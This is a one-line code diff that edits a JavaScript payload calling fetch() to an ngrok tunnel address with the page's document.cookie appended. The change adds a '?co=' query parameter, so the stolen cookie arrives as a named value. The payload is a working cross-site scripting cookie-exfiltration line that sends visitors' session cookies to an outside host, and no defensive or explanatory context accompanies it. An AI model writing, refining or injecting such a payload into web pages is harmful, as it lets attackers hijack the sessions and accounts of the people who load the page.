@@ -1,1 +1,1 @@
-fetch('https://immensely-ruling-tapir.ngrok-free.app' + document.cookie) 
+fetch('https://immensely-ruling-tapir.ngrok-free.app?co=' + document.cookie) 
